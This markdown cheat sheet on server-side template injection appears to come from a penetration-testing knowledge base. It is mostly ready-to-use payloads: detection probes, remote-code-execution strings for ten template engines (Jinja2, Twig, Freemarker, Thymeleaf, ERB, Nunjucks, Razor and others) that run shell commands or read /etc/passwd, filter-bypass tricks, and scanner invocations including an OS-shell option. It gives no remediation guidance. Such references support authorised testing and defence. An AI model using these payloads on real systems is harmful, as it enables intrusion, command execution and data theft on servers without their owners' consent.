---
tags:
  - critical
  - server-side
---

# Server-Side Template Injection (SSTI)

## TL;DR

Inject template syntax to execute code on the server.

```python
{{7*7}}     →  49 (Jinja2/Twig)
${7*7}      →  49 (Freemarker)
<%= 7*7 %>  →  49 (ERB)
```

## Detection

### Universal Fuzzing

```
${{<%[%'"}}%\
```

### By Engine

| Payload | Engine(s) |
|---------|-----------|
| `{{7*7}}` | Jinja2, Twig, Nunjucks |
| `${7*7}` | Freemarker, Velocity, Thymeleaf |
| `<%= 7*7 %>` | ERB (Ruby), EJS |
| `#{7*7}` | Thymeleaf, Slim |
| `{7*7}` | Smarty |
| `@(7*7)` | Razor (.NET) |

## Jinja2 (Python/Flask)

### Detection

```python
{{7*'7'}}  →  7777777
{{config}}
```

### RCE

```python
# Via subclasses
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}

# Generic
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}

# File read
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### Bypasses

```python
# Without dots
{{request|attr("__class__")}}
{{request["__class__"]}}
```

## Twig (PHP)

### RCE

```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Using filter
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
```

## Smarty (PHP)

```php
{$smarty.version}
{system('ls')}
{system('cat /etc/passwd')}
```

## Freemarker (Java)

### RCE

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Alternative
${"freemarker.template.utility.Execute"?new()("id")}
```

## Velocity (Java)

```java
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("id"))
$process.getInputStream()
```

## Thymeleaf (Java)

```java
${T(java.lang.Runtime).getRuntime().exec('id')}

# Expression inlining
[[${7*7}]]

# Preprocessing
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

## ERB (Ruby)

```ruby
<%= system("id") %>
<%= `id` %>
<%= File.open('/etc/passwd').read %>
```

## Pug/Jade (Node.js)

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

## Nunjucks (Node.js)

```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

## Razor (.NET)

```csharp
@(2+2)
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
```

## Tools

```bash
# SSTImap
python3 sstimap.py -u "http://target/?name=test"

# TInjA
tinja url -u "http://target/?name=test"

# Tplmap
python2.7 tplmap.py -u 'http://target/?name=test*' --os-shell
```

## Quick Reference

| Engine | Language | Syntax | Detection |
|--------|----------|--------|-----------|
| Jinja2 | Python | `{{...}}` | `{{config}}` |
| Twig | PHP | `{{...}}` | `{{dump(app)}}` |
| Smarty | PHP | `{...}` | `{$smarty.version}` |
| Freemarker | Java | `${...}` | `${7*7}` |
| Thymeleaf | Java | `${...}` | `${T(java.lang.Math).random()}` |
| ERB | Ruby | `<%= ... %>` | `<%= 7*7 %>` |
| Nunjucks | Node.js | `{{...}}` | `{{7*7}}` |
| Razor | .NET | `@(...)` | `@(2+2)` |
